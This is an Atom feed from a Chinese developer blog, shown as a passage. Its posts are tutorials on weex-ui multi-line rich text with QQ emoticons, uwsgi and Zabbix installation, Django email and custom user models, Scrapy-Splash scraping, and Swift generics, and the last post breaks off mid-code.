<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[独自一人]]></title>
  <link href="https://blog.mylonly.com/atom.xml" rel="self"/>
  <link href="https://blog.mylonly.com/"/>
  <updated>2018-04-19T08:47:38+08:00</updated>
  <id>https://blog.mylonly.com/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.coderforart.com/">CoderForArt</generator>

  
  <entry>
    <title type="html"><![CDATA[在wxc-rich-text以及wxc-special-rich-text的思路上实现类似QQ表情的富文本多行排版]]></title>
    <link href="https://blog.mylonly.com/15241067803366.html"/>
    <updated>2018-04-19T10:59:40+08:00</updated>
    <id>https://blog.mylonly.com/15241067803366.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">先上效果图:</h2>

<p><img src="https://pic.mylonly.com/2018-03-30-093130.jpg" alt=""/></p>

<h2 id="toc_1">wxc-rich-text和wxc-special-rich-text的实现思路</h2>

<p>weex-ui中为我们提供了<code>wxc-rich-text</code>和<code>wxc-special-rich-text</code>两种富文本控件，其中，<code>wxc-rich-text</code> 只支持单行富文本显示,而<code>wxc-special-rich-text</code>只能支持最多两行特定种类的图文混排(<code>标签+文本</code>以及<code>图标+文本</code>) </p>

<p>首先我们来分析<code>wxc-rich-text</code>的源码来看看为什么这个控件不支持多行的样式</p>

<p>在<code>wxc-rich-text.vue</code>的代码中，我们找到这样一段css的样式,下图红色箭头所指处</p>

<p><img src="https://pic.mylonly.com/2018-03-30-093159.jpg" alt=""/></p>

<p>这个样式中并没有指定flex-wrap属性，而在flex布局中，flex-wrap的默认属性就是<code>nowrap</code>不换行。</p>

<pre><code>是不是就是这个原因导致`wxc-rich-text`不支持换行呢？
如果真是这样，那么weex-ui的开发者为什么不把flex-wrap属性设置为wrap而提供一个支持多行的`wxc-rich-text`控件呢？
</code></pre>

<p>带着这个疑问，我们手动在<code>wxc-rich-text.vue</code>中将flex-wrap属性加上，这段css样式改为:</p>

<pre><code class="language-css">.wxc-rich-text {
    align-items: center;
    flex-direction: row;
    flex-wrap: wrap;
} 
</code></pre>

<p>好了，我们尝试输入一个多行的文本来看看效果:<br/>
<img src="https://pic.mylonly.com/2018-03-30-093213.jpg" alt=""/></p>

<p>在上图中我们发现，虽然整个控件的内容虽然确实有两行了，但是并不是我们想要的效果，文字部分并没有紧接着前面一个文字或者图片的后面，我想这也是为什么weex-ui的开发者在<code>wxc-rich-text</code>控件中不将flex-wrap属性设置为wrap的原因了。</p>

<p>好了，分析完<code>wxc-rich-text</code>不支持多行的原因，我们再来看看为什么<code>wxc-special-rich-text</code>可以支持两行的富文本呢？</p>

<p>当然还是先看源码,在<code>wxc-special-rich-text.vue</code>中，有下面一段代码:<br/>
<img src="https://pic.mylonly.com/2018-03-30-093224.jpg" alt=""/></p>

<p>代码当中有两个text控件，且两个text控件分别读取了newList[0]和newList[1]中的数据,为什么要如此呢，我们来看下面的js代码，在vue的computed当中，我们找到了名为<code>newList</code>的计算属性，代码有点长，我分别截了两张图<br/>
<img src="https://pic.mylonly.com/2018-03-30-093720.png" alt=""/><img src="https://pic.mylonly.com/2018-03-30-093640.png" alt=""/></p>

<p>如果你不想看上面的代码，可以直接看下面的结论：</p>

<p><code>这个newList中，就是将configLis中有的text文本内容切割成了两段文本分别放进两个text控件当中（依据前面已有的icon或者tag控件来计算第一行可以塞下的字符长度，其余字符就是第二行的文本内容）</code></p>

<p>好了，这下知道为什么<code>wxc-special-rich-text.vue</code>只能显示不超过两行的的富文本了吧，而且该富文本还必须要是<code>icon+text</code>或者<code>tag+text</code>的格式。</p>

<h2 id="toc_2">我的多行富文本实现思路</h2>

<p>既然<code>wxc-special-rich-text</code>通过将文本内容切割成两段文本来实现两行富文本的功能，那我能否通过将文本切割成粒度更小的的内容来解决多行富文本呢，这个粒度又是多少才最合适呢，我想，作为程序员，粒度为1应该是很容易想出来的一个数字，我也是如此。在粒度为1的情况下是不会存在<code>wxc-rich-text</code>中出现的因为第一行排列不下而将自己移至第二行从而导致第一行末端出现大量空白的情况。</p>

<p>那我们就在这个思路下实现我们自己的多行富文本</p>

<p>首先第一步，在<code>wxc-rich-text.vue</code>当中设置flex-wrap为wrap值，如上面文章所示。</p>

<p>如果你是用npm包的方式引入的weex-ui，那你可能就需要将wxc-rich-text.vue的代码拷贝一份，重新起个别的名字的控件了，然后再将flex-wrap属性设置成wrap。</p>

<p>第二步，将你的富文本内容切割成最小粒度的config，塞入<code>wxc-rich-text</code>的configList当中，我的实现如下:</p>

<pre><code class="language-javascript"> addNormalMessage:function(msg_id,sender,sender_level,title,message){
        console.log(&quot;normal message:&quot;,msg_id,sender,sender_level,title,message)
        var configList = []
        var config = this.addGrade(sender_level,title)
        if (config != {}){
          configList.push(config)
        }
        configList.push( {
          type: &#39;text&#39;,
          value: sender+&quot;:&quot;,
          theme: &#39;blue&#39;
        })

        var message_list = this.addMessage(message)

        message_list.forEach(config =&gt; {
          configList.push(config)
        })     
        this.messages.push(configList)
        this.messagesDict[msg_id] = this.messages.length - 1
        this.scroolToEnd()
    },
</code></pre>

<p>代码当中有三个部分的内容，addGrade是增加徽标的config，此处代码有点啰嗦，因为当时应该是直接复制拷贝的，可以通过设置value，color等等一些变量让代码精简很多。</p>

<pre><code class="language-javascript">addGrade(sender_level,title){
          console.log(&quot;grade:&quot;,sender_level,title)
          var config = {}
            if (sender_level == 500){
              config = {
                  type: &#39;tag&#39;,
                  value: &#39;讲师&#39;,
                  style: {
                    fontSize: 30,
                    color: &#39;#ffffff&#39;,
                    borderColor: &#39;#2d9b3a&#39;,
                    backgroundColor: &#39;#2d9b3a&#39;,
                    height: 40
                  }
              }
            }else if(sender_level == 900){
              config = {
                type:&#39;tag&#39;,
                value:&#39;管理&#39;,
                style: {
                  fontSize: 30,
                  color: &#39;#ffffff&#39;,
                  borderColor: &#39;#ec24dd&#39;,
                  backgroundColor: &#39;#ec24dd&#39;,
                  height: 40
                }
              }
            }else if(sender_level == 2000){
              config = {
                type:&#39;tag&#39;,
                value:&#39;室主&#39;,
                style:{
                  fontSize:30,
                  color: &#39;#ffffff&#39;,
                  borderColor: &#39;#e80c19&#39;,
                  backgroundColor: &#39;#e80c19&#39;,
                  height: 40
                }
              }
            }else{
              if(title &gt;= 0){
                config = {
                  type:&#39;icon&#39;,
                  src:&quot;bmlocal://assets/grade/Grade_&quot;+title+&quot;.png&quot;,
                  style: {
                    width: 90,
                    height: 40
                  }
                }
              }
            }
            return config
        },
</code></pre>

<p>然后加上发送人的姓名，最后加上聊天的内容addMessage,在addMessage当中我实现了QQ表情的匹配已经文本内容的切割</p>

<pre><code>addMessage(message){
      var char_list = []
      var chars = message.split(&#39;&#39;)
      var startIndex = -1
      chars.forEach((char,index,array) =&gt; {
        if(char == &#39;[&#39;){
          startIndex = index
        }else if(char == &#39;]&#39;){
          if(startIndex != -1){
            var emotionStr = array.slice(startIndex,index+1).join(&quot;&quot;)
    
            if (emotionStr.indexOf(&quot;http&quot;) &gt; -1){  //图文消息
              var imageUrl = emotionStr.slice(1,index)
              char_list.push(this.oneImageConfig(imageUrl))
            }else{//表情文字
              char_list.push(this.oneEmojConfig(emotionStr))
            }
    
            startIndex = -1
        
          }else{
            char_list.push(this.oneCharConfig(char))
          }
        }else{
          if (startIndex == -1){
            char_list.push(this.oneCharConfig(char))
          }
        }
      });
      return char_list
    },
</code></pre>

<p>我们的业务当中，和大部分公司类似，我们的QQ表情是类似于[微笑][害羞]这种格式的。其中在查找表情的代码中，也许你们会疑问，为什么我不使用正则去匹配QQ表情，其实在我之前未重构之前的项目中（使用swift的作为开发语言），此处业务逻辑就是通过正则将QQ表情替换出来，但是在此处，由于要切割字符串为每个字符串返回一个配置，字符串的逐个遍历已经不可避免，如果在加上正则匹配，时间负责度反而会增加一倍，所以我直接在遍历循环中加入了查找QQ表情的代码，希望能减轻少许我这种投机取巧的方法实现多行富文本样式带来的性能损耗。</p>

<pre><code class="language-javascript">oneEmojConfig(emojName){
  var localPath = emotion.emojLocalPath(emojName)
  console.log(&quot;localpath:&quot;,localPath)
  if( localPath != null){
    return {
      type:&#39;icon&#39;,
      src:localPath,
      style:{
        width:40,
        height:40
      }
    }
  }else{
    return {
      type:&#39;text&#39;,
      value:emojName,
      theme:&quot;yellow&quot;
    }
  }
},
</code></pre>

<p>在设置QQ表情的config当中，我写了一个emotion.js的工具函数，用来返回QQ表情名字所对应的本地图片的路径</p>

<p><code>emotion.js</code></p>

<pre><code class="language-javascript">/**
 * 表情转换工具类
 * @authors Root (root@mylonly.com)
 * @date    2018-03-30 08:48:19
 * @version 1.0.0
 */



let emotionFunc = {
    emotionArray : [&quot;[微笑]&quot;,&quot;[撇嘴]&quot;,&quot;[色]&quot;,&quot;[发呆]&quot;,&quot;[得意]&quot;,&quot;[流泪]&quot;,&quot;[害羞]&quot;,&quot;[闭嘴]&quot;,&quot;[睡]&quot;,&quot;[大哭]&quot;,&quot;[尴尬]&quot;,&quot;[发怒]&quot;,&quot;[调皮]&quot;,&quot;[呲牙]&quot;,&quot;[惊讶]&quot;,&quot;[难过]&quot;,&quot;[酷]&quot;,&quot;[冷汗]&quot;,&quot;[抓狂]&quot;,&quot;[吐]&quot;,&quot;[偷笑]&quot;,&quot;[可爱]&quot;,
&quot;[白眼]&quot;,&quot;[傲慢]&quot;,&quot;[饥饿]&quot;,&quot;[困]&quot;,&quot;[惊恐]&quot;,&quot;[流汗]&quot;,&quot;[憨笑]&quot;,&quot;[大兵]&quot;,&quot;[奋斗]&quot;,&quot;[咒骂]&quot;,&quot;[疑问]&quot;,&quot;[嘘]&quot;,&quot;[晕]&quot;,&quot;[折磨]&quot;,&quot;[衰]&quot;,&quot;[骷髅]&quot;,&quot;[敲打]&quot;,&quot;[再见]&quot;,&quot;[擦汗]&quot;,&quot;[抠鼻]&quot;,&quot;[鼓掌]&quot;,&quot;[糗大了]&quot;,&quot;[坏笑]&quot;,&quot;[左哼哼]&quot;,&quot;[右哼哼]&quot;,&quot;[哈欠]&quot;,
&quot;[鄙视]&quot;,&quot;[委屈]&quot;,&quot;[快哭了]&quot;,&quot;[阴险]&quot;,&quot;[亲亲]&quot;,&quot;[吓]&quot;,&quot;[可怜]&quot;,&quot;[菜刀]&quot;,&quot;[西瓜]&quot;,&quot;[啤酒]&quot;,&quot;[篮球]&quot;,&quot;[乒乓]&quot;,&quot;[咖啡]&quot;,&quot;[饭]&quot;,&quot;[猪头]&quot;,&quot;[玫瑰]&quot;,&quot;[凋谢]&quot;,&quot;[示爱]&quot;,&quot;[爱心]&quot;,&quot;[心碎]&quot;,&quot;[蛋糕]&quot;,&quot;[闪电]&quot;,&quot;[炸弹]&quot;,&quot;[刀]&quot;,&quot;[握手]&quot;,&quot;[胜利]&quot;,
&quot;[便便]&quot;,&quot;[NO]&quot;,&quot;[OK]&quot;,&quot;[抱拳]&quot;,&quot;[弱]&quot;,&quot;[强]&quot;],

    emojLocalPath:function(emoj_name){
      var index = this.emotionArray.indexOf(emoj_name)
      if (index &gt; -1){
          return &quot;bmlocal://assets/emotions/&quot;+index+&quot;@2x.png&quot;
      }
      return null
    },
    emojName:function(index){
        if (index &lt; this.emotionArray.length){
            return this.emotionArray[index]
        }
        return null
    }
}

export default emotionFunc;

</code></pre>

<p>至此，我的整个实现已经完全呈现出来了，如果你能看懂我上面所写，正好你也正好有和我类似的需求，相信你也能在我的思路下实现自己的业务代码。</p>

<p>最后，愿世界和平！！！</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ubuntu 安装uwsgi]]></title>
    <link href="https://blog.mylonly.com/15126534156721.html"/>
    <updated>2017-12-07T21:30:15+08:00</updated>
    <id>https://blog.mylonly.com/15126534156721.html</id>
    <content type="html"><![CDATA[
<p>先源码安装python3.6（记得先用apt-get 安装好一些系统库zlib_dev,openssl_dev）<br/>
然后利用pip3 安装uwsgi</p>

<pre><code class="language-Shell">wget https://www.python.org/ftp/python/3.6.3/Python-3.6.3.tar.xz
tar -xvf Python-3.6.3.tar.xz
cd Python-3.6.3/

apt-get install zlib1g-dev
apt-get install libssl-dev
apt-get install sqlite3


./configure --enable-loadable-sqlite-extensions

make &amp;&amp; sudo make install


pip3 install uwsgi

uwsgi -i /data/web/xxxx.ini
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Django 发送html格式的邮件]]></title>
    <link href="https://blog.mylonly.com/15119665687635.html"/>
    <updated>2017-11-29T22:42:48+08:00</updated>
    <id>https://blog.mylonly.com/15119665687635.html</id>
    <content type="html"><![CDATA[
<p>django中默认提供了发送邮件的库<code>mail</code>，通过这个库我们可以很方便的通过django发送一份电子邮件</p>

<h5 id="toc_0">1. 在setting 中指定邮件服务器的基本信息</h5>

<pre><code class="language-Python">EMAIL_USE_SSL = True    
EMAIL_HOST = &#39;smtp.exmail.qq.com&#39;  # 如果是 163 改成 smtp.163.com
EMAIL_PORT = 465
EMAIL_HOST_USER = &#39;***@domain.com&#39; # 帐号
EMAIL_HOST_PASSWORD = &#39;password&#39;  # 密码
DEFAULT_FROM_EMAIL = EMAIL_HOST_USER
</code></pre>

<h5 id="toc_1">2. 引用mail库发送邮件</h5>

<pre><code class="language-Python">from django.core.mail import EmailMessage
from Across.settings import EMAIL_HOST_USER

msg = EmailMessage(&quot;邮件标题&quot;,&quot;邮件内容&quot;,EMAIL_HOST_USER,[接受邮件列表])
msg.send()
</code></pre>

<h5 id="toc_2">3.发送html模板邮件</h5>

<p>可以利用Django的template库读取指定的html模板，然后将参数代入，首选需要在settings中设置template的目录</p>

<pre><code class="language-Python">TEMPLATES = [
    {
        &#39;BACKEND&#39;: &#39;django.template.backends.django.DjangoTemplates&#39;,
        &#39;DIRS&#39;: [
            os.path.join(BASE_DIR,&#39;templates&#39;)  ##你的模板目录
        ],
        &#39;APP_DIRS&#39;: True,
        &#39;OPTIONS&#39;: {
            &#39;context_processors&#39;: [
                &#39;django.template.context_processors.debug&#39;,
                &#39;django.template.context_processors.request&#39;,
                &#39;django.contrib.auth.context_processors.auth&#39;,
                &#39;django.contrib.messages.context_processors.messages&#39;,
            ],
        },
    },
]
</code></pre>

<p>然后将你准备好的html模板放入该目录，然后就是利用temlate的loader函数加载模板传入指定参数</p>

<pre><code class="language-Python">html_content = loader.render_to_string(&#39;email.html&#39;,{&#39;authcode&#39;:random,&#39;title&#39;:&quot;标题标题&quot;,&#39;operation&#39;:operation_str})
msg = EmailMessage(&quot;您的验证码&quot;,html_content,EMAIL_HOST_USER,[email])
msg.content_subtype = &quot;html&quot; # Main content is now text/html
msg.send()
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Django扩展默认的User Model]]></title>
    <link href="https://blog.mylonly.com/15117871248079.html"/>
    <updated>2017-11-27T20:52:04+08:00</updated>
    <id>https://blog.mylonly.com/15117871248079.html</id>
    <content type="html"><![CDATA[
<p>Django中为我们默认提供了用户模块<code>User</code>,但是其当中的字段可能并不能完全满足我们的需求，这时我们就需要自定义一个<code>User Model</code>出来,如果你对自带的User模型很满意，仅仅是需要添加几个额外的字段，你就可以新建一个model类继承<code>AbstractUser</code>, 或者你完全不需要User模型中提供的类似<code>first_name</code>、<code>last_name</code>这些字段，你可以将<code>model</code>类继承<code>AbstractBaseUser</code>,这样只会保留<code>password</code>,<code>last_login</code>,<code>is_active</code>这三个字段。</p>

<blockquote>
<p>本文介绍的是继承自<code>AbstractUser</code>的用法</p>
</blockquote>

<p>在models.py中新建一个model继承自AbstractUser</p>

<pre><code>from django.db import models

# Create your models here.
from django.contrib.auth.models import AbstractUser
from enum import Enum


class UserProfile(AbstractUser):

    GENDER = [
        (0,&quot;未知&quot;),
        (1,&quot;男性&quot;),
        (2,&quot;女性&quot;)
    ]

    nickname = models.CharField(max_length=50)
    intro = models.CharField(max_length=500)
    mobile = models.CharField(max_length=13)
    gender = models.IntegerField(choices=GENDER,default=0)

    REQUIRED_FIELDS = [&#39;nickname&#39;, &#39;intro&#39;, &#39;mobile&#39;, &#39;gender&#39;]

</code></pre>

<p>在setting.py中设置 <code>AUTH_USER_MODEL</code></p>

<pre><code>AUTH_USER_MODEL = &#39;User.UserProfile&#39;
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用Scrapy-Splash抓取JS动态渲染的网页数据]]></title>
    <link href="https://blog.mylonly.com/15052000291680.html"/>
    <updated>2017-09-12T15:07:09+08:00</updated>
    <id>https://blog.mylonly.com/15052000291680.html</id>
    <content type="html"><![CDATA[
<p>随着越来越多的网站开始用JS在客户端浏览器动态渲染网站，导致很多我们需要的数据并不能由原始的html中获取，再加上Scrapy本身并不提供JS渲染解析的功能，通常对这类网站数据的爬取我们一般采用两种方法：</p>

<ol>
<li>通过分析网站，找到对应数据的接口，模拟接口去获取我们需要的数据(参见<a href="https://www.mylonly.com/14945011244738.html">Scrapy抓取Ajax动态页面</a>),但是一旦该网站的接口隐藏的很深，或者接口的加密过于复杂，此种方法可能就有点行不通了</li>
<li>借助JS内核，将获取到的含有JS脚本的页面交由JS内核去渲染，最后将渲染后生成的html返回给Scrapy分析，比较常见的WebKit和Scrapy-Splash</li>
</ol>

<p>本篇文章的目的就是用来介绍如何使用Scrapy-Splash来配合Scrapy抓取动态页面这个问题。</p>

<h3 id="toc_0">准备工作</h3>

<ol>
<li><p>Docker安装,具体安装步骤参考<a href="https://docs.docker.com/engine/installation/">Docker官网</a></p>

<blockquote>
<p>为什么要安装Docker?<br/>
因为Scrapy-Splash使用了<code>Splash HTTP API</code>,所以你需要提供一个Splash实例，而在Docker镜像中已经有现成的Splash实例了，可以很方便的使用。</p>
</blockquote></li>
<li><p>Docker镜像源更改,参考<a href="https://ieevee.com/tech/2016/09/28/docker-mirror.html">国内 docker 仓库镜像对比</a></p></li>
<li><p>安装运行Splash</p>

<pre><code>docker pull scrapinghub/splash   #从docker镜像中拉取splash实例
docker run -p 8050:8050 scrapinghub/splash  #启动splash实例
</code></pre></li>
</ol>

<h3 id="toc_1">Scrapy配置</h3>

<p>在Scrapy项目的setting.py中加入如下内容：</p>

<pre><code class="language-Python">SPLASH_URL = &#39;http://localhost:8050&#39;  

DOWNLOADER_MIDDLEWARES = {
&#39;scrapy_splash.SplashCookiesMiddleware&#39;: 723,
&#39;scrapy_splash.SplashMiddleware&#39;: 725,
&#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;: 810,
}

SPIDER_MIDDLEWARES = {
&#39;scrapy_splash.SplashDeduplicateArgsMiddleware&#39;: 100,
}

DUPEFILTER_CLASS = &#39;scrapy_splash.SplashAwareDupeFilter&#39;

HTTPCACHE_STORAGE = &#39;scrapy_splash.SplashAwareFSCacheStorage&#39;

</code></pre>

<h3 id="toc_2">实际代码解析</h3>

<p>我们以<a href="http://stock.qq.com/l/stock/ywq/list20150423143546.htm">腾讯证券</a>这个页面为例，腾讯的证券新闻列表是js动态渲染而成</p>

<p>我们直接打开这个链接，然后打开开发者工具，定位到新闻列表处:<br/>
<img src="https://pic.mylonly.com/2017-09-12-074653.jpg" alt=""/></p>

<p>我们在从network中查看第一次请求的Response时发现，返回的html中该列表页处是空的<br/><br/>
<img src="https://pic.mylonly.com/2017-09-12-075028.jpg" alt=""/></p>

<p>实际的数据被藏着JS里，加载完成后由JS操作DOM插入完成<br/>
<img src="https://pic.mylonly.com/2017-09-12-075305.jpg" alt=""/></p>

<p>此处由于实际数据被塞到了一段JS的变量里面，并不是由Ajax调用接口获取的，因此为了避免自己手动去截取js变量，我们便将该页面交给Scrapy-Splash渲染</p>

<pre><code class="language-Python">import scrapy
from FinancialInfoSpider.items import ArticleItem
from scrapy_splash import SplashRequest
from w3lib.html import remove_tags
import re
from bs4 import BeautifulSoup

class TencentStockSpider(scrapy.Spider):
    name = &quot;TencentStock&quot;
    def start_requests(self):
        urls = [
           &#39;http://stock.qq.com/l/stock/ywq/list20150423143546.htm&#39;,
        ]

        for url in urls:
            yield SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})

    def parse(self,response):

        sel = scrapy.Selector(response)
        links = sel.xpath(&quot;//div[@class=&#39;qq_main&#39;]//ul[@class=&#39;listInfo&#39;]//li//div[@class=&#39;info&#39;]//h3//a/@href&quot;).extract()
        requests = []
        
        for link in links:
            request = scrapy.Request(link, callback =self.parse_article)
            requests.append(request)
        return requests

    def parse_article(self,response):

        sel = scrapy.Selector(response)

        article = ArticleItem()
        article[&#39;title&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/h1/text()&#39;).extract()[0]
        article[&#39;source&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/div/div[1]/span[2]&#39;).xpath(&#39;string(.)&#39;).extract()[0]
        article[&#39;pub_time&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/div/div[1]/span[3]/text()&#39;).extract()[0]
        
        html_content = sel.xpath(&#39;//*[@id=&quot;Cnt-Main-Article-QQ&quot;]&#39;).extract()[0]
        article[&#39;content&#39;] = self.remove_html_tags(html_content)
        return article


    def remove_html_tags(self,html):
        
        soup = BeautifulSoup(html)
        [s.extract() for s in soup(&#39;script&#39;)]
        [s.extract() for s in soup(&#39;style&#39;)] 
         
        content = &#39;&#39;
        for substring in soup.stripped_strings:
            content = content + substring

        return content       
</code></pre>

<p>主要代码就一句，将获取到的页面发送给本地的Splash实例去渲染解析，最后将结果返回给parse函数解析</p>

<pre><code>SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})
</code></pre>

<p>里面用了BeautifulSoup这个库去除了html中得script和style标签，具体用法可以参考这两篇文章:</p>

<p><a href="http://cuiqingcai.com/1319.html">Python爬虫利器二之Beautiful Soup的用法</a><br/>
<a href="https://my.oschina.net/letiantian/blog/504669">使用BeautifulSoup删除html中的script、注释</a></p>

<p>输出结果:</p>

<p><img src="https://pic.mylonly.com/2017-09-12-080930.jpg" alt=""/></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CentOS6 安装部署Zabbix]]></title>
    <link href="https://blog.mylonly.com/14972546183511.html"/>
    <updated>2017-06-12T16:03:38+08:00</updated>
    <id>https://blog.mylonly.com/14972546183511.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p>
</blockquote>

<h2 id="toc_0">部署LAMP|LNMP环境</h2>

<p>由于Zabbix的Web管理页面是由php写的，所以需要服务器PHP环境的支持，Linux部署LAMP或者LNMP的教程很多，在此就不在赘述。<br/>
需要注意的是:Zabbix支持的PHP最低版本是PHP5.4,而目前CentOS6中通过yum安装的php版本为5.3，所以最好采用源码编译安装。<br/>
当然，如果你觉得自己搞不定源码安装的各种编译参数，本文也给出一种yum安装php5.5版本的方法</p>

<h3 id="toc_1">Yum 安装PHP5.5</h3>

<ol>
<li>CentOS6安装PHP5.5源
<code>rpm -ivh http://mirror.webtatic.com/yum/el6/latest.rpm</code></li>
<li>安装php5.5
<code>yum install php55w php55w-gd php55w-mbstring php55w-mysql php55w-fpm php55w-bcmath php55w-xmlreader php55w-xmlwriter</code></li>
</ol>

<p>修改PHP配置，编辑/etc/php.ini,修改下列参数</p>

<pre><code>max_execution_time = 300
max_input_time = 300
memory_limit = 128M
post_max_size = 32M
date.timezone = Asia/Shanghai
</code></pre>

<h2 id="toc_2">zabbix数据库</h2>

<ol>
<li>从<a href="http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/3.2.6/zabbix-3.2.6.tar.gz/download%5D">zabbix-3.2.6</a>下载最新版本的zabbix源码并解压至当前目录</li>
<li>进入mysql数据库  <code>mysql -u root -p</code></li>
<li>创建zabbix数据库 <code>create database zabbix character set utf8;</code></li>
<li>创建zabbix用户并给与进入zabbix数据库的权限（用户名:zabbix,密码:123456） `grant all privileges on zabbix.* to zabbix@&#39;%&#39; identified by &#39;123456&#39;;</li>
<li>刷新系统权限表 <code>flush privileges;</code></li>
<li><p>进入之前下载的zabbix源码目录，找到database文件夹，里面有<code>schema.sql</code>、<code>images.sql</code>、<code>data.sql</code>，将这三个sql文件依次导入之前创建好的zabbix数据库中（PS,请按照schema-&gt;images-&gt;data的顺序依次导入，否则会出错）</p>

<pre><code>mysql&gt; use zabbix;
mysql&gt; source /root/zabbix-3.2.6/database/schema.sql;
mysql&gt; source /root/zabbix-3.2.6/database/images.sql;
mysql&gt; source /root/zabbix-3.2.6/database/data.sql;
</code></pre></li>
</ol>

<h2 id="toc_3">添加zabbix用户和组</h2>

<pre><code>groupadd zabbix
useradd -g zabbix -m zabbix
</code></pre>

<h2 id="toc_4">安装zabbix其他依赖包</h2>

<pre><code>yum install net-snmp-devel curl curl-devel mysql-devel
</code></pre>

<h2 id="toc_5">编译安装zabbix</h2>

<ol>
<li><p>进入zabbix源码根目录，生成makefile</p>

<pre><code>./configure --prefix=/usr/local/zabbix --with-mysql --with-net-snmp --with-libcurl --enable-server --enable-agent --enable-proxy
</code></pre></li>
<li><p>安装</p>

<pre><code>make
make install
</code></pre></li>
</ol>

<h2 id="toc_6">添加zabbix服务对应的端口</h2>

<pre><code>vim /etc/services ##在文件中加入以下端口
zabbix-agent 10050/tcp # Zabbix Agent
zabbix-agent 10050/udp # Zabbix Agent
zabbix-trapper 10051/tcp # Zabbix Trapper
zabbix-trapper 10051/udp # Zabbix Trapper
</code></pre>

<h2 id="toc_7">修改zabbix配置</h2>

<ol>
<li><p>修改 /usr/local/zabbix/etc/zabbix_server.conf</p>

<pre><code>DBName=zabbix #数据库名称

DBUser=zabbix #数据库用户名

DBPassword=123456 #数据库密码

ListenIP=127.0.0.1 #数据库ip地址

AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts #zabbix运行脚本存放目录
</code></pre></li>
<li><p>修改 /usr/local/zabbix/etc/zabbix_agentd.conf</p>

<pre><code>Include=/usr/local/zabbix/etc/zabbix_agentd.conf.d/
</code></pre></li>
</ol>

<h2 id="toc_8">让zabbix开机启动</h2>

<ol>
<li><p>拷贝可执行文件至init.d目录</p>

<pre><code>cp /usr/local/zabbix/sbin/zabbix_server /etc/rc.d/init.d/zabbix_server  #服务端
cp /usr/local/zabbix/sbin/zabbix_agentd /etc/rc.d/init.d/zabbix_agentd  #客户端
</code></pre></li>
<li><p>添加脚本执行权限</p>

<pre><code>chmod +x /etc/rc.d/init.d/zabbix_server
chmod +x /etc/rc.d/init.d/zabbix_agentd 
</code></pre></li>
<li><p>加入开机启动</p>

<pre><code>chkconfig zabbix_server on
chkconfig zabbix_agentd on
</code></pre></li>
<li><p>修改开启启动脚本中zabbix的安装路径,分别用vim打开/etc/rc.d/init.d/zabbix_server和/etc/rc.d/init.d/zabbix_agentd,修改BASEDIR参数为/usr/local/zabbix</p>

<pre><code>BASEDIR=/usr/local/zabbix/ #zabbix安装目录
</code></pre></li>
</ol>

<h2 id="toc_9">安装zabbix web管理页面</h2>

<ol>
<li><p>拷贝zabbix源码当中的frontends/php下面的所有文件至web服务器的根目录，重启web服务器，如果你的LNMP环境或者LAMP环境没有问题的话，浏览器中输入服务器地址应该会出现zabbix的setup页面</p></li>
<li><p>点击next按钮，之后会检测zabbix所需要的条件是否完全支持(PS:缺少什么就安装什么，一定要全部OK才可继续下去)</p></li>
<li><p>之后会出现连接数据库的页面,填入之前创建zabbix数据库时的信息</p></li>
<li><p>第4步出现当前zabbix服务器的一些基本信息，name填一下</p></li>
<li><p>安装向导会自动在服务器根目录下的conf下创建一个zabbix.conf.php文件,如果你的根目录权限设置不正确导致向导无法写入文件，这时就需要你手动将这个文件上传到服务器的正确目录</p></li>
<li><p>一切OK之后就会出现登录页面，初始用户名admin,初始密码zabbix</p></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Swift3.0 利用泛型设置基类属性的动态类型]]></title>
    <link href="https://blog.mylonly.com/14957025459875.html"/>
    <updated>2017-05-25T16:55:45+08:00</updated>
    <id>https://blog.mylonly.com/14957025459875.html</id>
    <content type="html"><![CDATA[
<p>在MVVM架构的项目中，我们一般会写一个viewModel的基类和一个controller的基类，在controller的对象中持有viewModel,如下代码</p>

<pre><code class="language-Swift">class ViewModel{
    
}
class Controller {

    var viewModel:ViewModel
    
    init(viewModel:ViewModel) {
        self.viewModel = viewModel
    }
}
</code></pre>

<p>然后在每一个具体的页面上，都会写一个对应的viewModel和controller分别继承自上面两个基类</p>

<pre><code class="language-Swift">class Sub1ViewModel:ViewModel{
    
    let desc = &quot;Sub1&quot;

}
class Sub1Controller:Controller{
    
}
</code></pre>

<p>这时如果我想在Sub1Controller中访问Sub1ViewModel中的desc变量，只能在Sub1Controller中这样写</p>

<pre><code class="language-Swift">class Sub1Controller:Controller{
    var description{
        let viewModel = self.viewModel as! Sub1ViewModel
        return viewModel.desc
    }
}
</code></pre>

<p>由于Swift是强类型语言，不能像OC那样通过类型的强制转换来使基类的属性变成子类的类型，所以你每次使用基类的属性的时候都必须要用as强制转换成子类的类型之后才能访问子类的属性或者方法，当然你可以将这个强制转换包装成一个函数，或者提供另一个变量返回强制转换过的类型。</p>

<pre><code class="language-Swift">class Sub1Controller:Controller{
    var sub1ViewModel:Sub1ViewModel{
        return self.viewModel as! Sub1ViewModel
    }
    var description{
    //  let viewModel = self.viewModel as! Sub1ViewModel
        return self.sub1ViewModel.desc  // Or: return self.sub1ViewModel().desc
    }
    
    func sub1ViewModel() -&gt; Sub1ViewModel{
